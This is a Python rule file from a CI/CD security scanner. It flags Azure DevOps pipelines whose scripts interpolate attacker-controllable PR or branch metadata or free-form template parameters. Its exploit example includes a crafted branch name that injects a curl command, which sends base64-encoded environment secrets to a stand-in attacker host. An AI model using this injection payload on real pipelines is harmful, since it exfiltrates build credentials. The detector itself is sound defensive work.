"""ADO-002, scripts must not interpolate attacker-controllable vars."""
from __future__ import annotations

import re
from typing import Any

from ..._primitives.tainted_variables import (
    has_direct_taint,
    has_unsafe_reference,
)
from ..._yaml_lines import line_of
from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps
from ._helpers import UNTRUSTED_VAR_RE

RULE = Rule(
    id="ADO-002",
    title="Script injection via attacker-controllable context",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78",),
    recommendation=(
        "Pass these values through an intermediate pipeline variable "
        "declared with `readonly: true`, and reference that variable "
        "through an environment variable rather than `$(...)` macro "
        "interpolation. ADO expands `$(…)` before shell quoting, so "
        "inline use is never safe."
    ),
    docs_note=(
        "`$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, "
        "and `$(System.PullRequest.*)` are populated from SCM event "
        "metadata the attacker controls. Inline interpolation into a "
        "script body executes crafted content.\n\n"
        "The rule inspects:\n\n"
        "- Script bodies from the `script:` / `bash:` / `pwsh:` / "
        "`powershell:` shorthands.\n"
        "- Inline scripts in a task's `inputs.script` (Bash@3 / "
        "PowerShell@2 / CmdLine@2).\n"
        "- Compile-time template injection: a free-form `string` "
        "parameter (no `values:` allowlist) spliced into a script via "
        "`${{ parameters.X }}`, which becomes pipeline structure before "
        "any quoting applies."
    ),
    exploit_example=(
        "# Vulnerable: PR title macro interpolated straight into script.\n"
        "trigger: none\n"
        "pr:\n"
        "  branches:\n"
        "    include: [main]\n"
        "jobs:\n"
        "  - job: triage\n"
        "    pool: { vmImage: ubuntu-latest }\n"
        "    steps:\n"
        "      - script: |\n"
        "          echo \"New PR: $(System.PullRequest.SourceBranch)\"\n"
        "          echo \"Subject: $(Build.SourceVersionMessage)\"\n"
        "\n"
        "# Attack: open a PR from a branch whose name carries shell:\n"
        "#\n"
        "#   git checkout -b 'foo\";curl https://attacker/exfil \\\n"
        "#     -d \"$(printenv | base64)\";echo \"x'\n"
        "#\n"
        "# ADO expands ``$(...)`` BEFORE shell quoting, so the macro\n"
        "# value's `\"` closes the echo and the rest becomes shell.\n"
        "# The PR-validated pipeline has the same service-connection\n"
        "# credentials a main-branch build would have, so the curl\n"
        "# exfils every secret in scope. Classic pwn-request shape.\n"
        "\n"
        "# Safe: route through env so the value is never interpolated\n"
        "# into the shell template.\n"
        "      - bash: |\n"
        "          echo \"New PR: $PR_BRANCH\"\n"
        "          echo \"Subject: $COMMIT_MSG\"\n"
        "        env:\n"
        "          PR_BRANCH: $(System.PullRequest.SourceBranch)\n"
        "          COMMIT_MSG: $(Build.SourceVersionMessage)"
    ),
)


def _tainted_vars(variables_block: Any) -> set[str]:
    """Return variable names whose values reference untrusted ADO macros.

    Azure pipelines accept two shapes for ``variables:``, a dict
    (``{NAME: VALUE}``) or a list of single-key dicts
    (``- name: NAME, value: VALUE``). Both are scanned.
    """
    tainted: set[str] = set()
    if isinstance(variables_block, dict):
        for name, value in variables_block.items():
            if isinstance(value, str) and UNTRUSTED_VAR_RE.search(value):
                tainted.add(str(name))
    elif isinstance(variables_block, list):
        for item in variables_block:
            if not isinstance(item, dict):
                continue
            name = item.get("name")
            value = item.get("value")
            if (
                isinstance(name, str)
                and isinstance(value, str)
                and UNTRUSTED_VAR_RE.search(value)
            ):
                tainted.add(name)
    return tainted


def _freeform_params(doc: dict[str, Any]) -> set[str]:
    """Names of free-form ``string`` parameters (no ``values:`` allowlist).

    A ``${{ parameters.X }}`` template expression is substituted into the
    pipeline at COMPILE time, before any shell quoting exists, so splicing
    a free-form string parameter into a script body is template injection:
    the value becomes pipeline structure, not just data. A parameter
    constrained by a ``values:`` enum can only take allowed values, so it
    is excluded.
    """
    params = doc.get("parameters")
    names: set[str] = set()
    if not isinstance(params, list):
        return names
    for p in params:
        if not isinstance(p, dict):
            continue
        name = p.get("name")
        if (
            isinstance(name, str)
            and p.get("type", "string") == "string"
            and "values" not in p
        ):
            names.add(name)
    return names


def _template_param_re(name: str) -> re.Pattern[str]:
    """Match ``${{ parameters.<name> }}`` (any internal whitespace)."""
    return re.compile(rf"\$\{{\{{\s*parameters\.{re.escape(name)}\s*\}}\}}")


def _ado_ref_pattern(name: str) -> str:
    """Match every ADO reference syntax for *name*: ``$(VAR)`` (macro),
    ``$env:VAR`` (PowerShell), and ``$VAR`` / ``${VAR}`` (bash).

    The bash alternative uses ``\b`` for the bare form and requires the
    closing ``}`` for the braced form, preventing ``$BR`` from matching
    inside the longer token ``$BRANCHX``.
    """
    n = re.escape(name)
    return (
        rf"\$\(\s*{n}\s*\)"         # $(VAR)
        rf"|\$env:{n}\b"             # $env:VAR
        rf"|\$(?:\{{{n}\}}|{n}\b)"  # ${VAR} (must close brace) / $VAR\b
    )


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    seen_step_lines: set[int] = set()
    pipeline_tainted = _tainted_vars(doc.get("variables"))
    freeform_param_res = [_template_param_re(p) for p in _freeform_params(doc)]
    for job_loc, job in iter_jobs(doc):
        job_tainted = pipeline_tainted | _tainted_vars(job.get("variables"))
        for step_loc, step in iter_steps(job):
            # Script bodies live either on a shorthand key (``script:`` /
            # ``bash:`` / ``pwsh:`` / ``powershell:``) or, for a task-based
            # step (``task: Bash@3`` / ``PowerShell@2`` / ``CmdLine@2``),
            # inline under ``inputs.script``. Both carry the same injection
            # exposure, so both are scanned.
            bodies: list[str] = [
                step[key] for key in ("script", "bash", "pwsh", "powershell")
                if isinstance(step.get(key), str)
            ]
            inputs = step.get("inputs")
            if isinstance(inputs, dict) and isinstance(inputs.get("script"), str):
                bodies.append(inputs["script"])
            loc = f"{job_loc}.{step_loc}"
            hit = False
            for body in bodies:
                lines = body.splitlines()
                # 1. Direct interpolation of untrusted ADO macros.
                if has_direct_taint(lines, UNTRUSTED_VAR_RE) or job_tainted and has_unsafe_reference(
                    lines, job_tainted, ref_pattern=_ado_ref_pattern
                ):
                    offenders.append(loc)
                    hit = True
                    break
                # 2. Template injection: a free-form ``string`` parameter
                #    spliced into the script at compile time. No quoting
                #    carve-out, the substitution precedes shell parsing.
                if any(rx.search(body) for rx in freeform_param_res):
                    offenders.append(loc)
                    hit = True
                    break
            if hit:
                step_line = line_of(step)
                if step_line is not None and step_line not in seen_step_lines:
                    seen_step_lines.add(step_line)
                    locations.append(Location(
                        path=path,
                        start_line=step_line, end_line=step_line,
                    ))
    passed = not offenders
    desc = (
        "No script interpolates attacker-controllable build or PR metadata."
        if passed else
        f"Script(s) in {', '.join(sorted(set(offenders))[:5])} "
        f"interpolate $(Build.SourceBranch*), "
        f"$(Build.SourceVersionMessage), or $(System.PullRequest.*) "
        f"directly or via variables: inheritance into shell commands."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
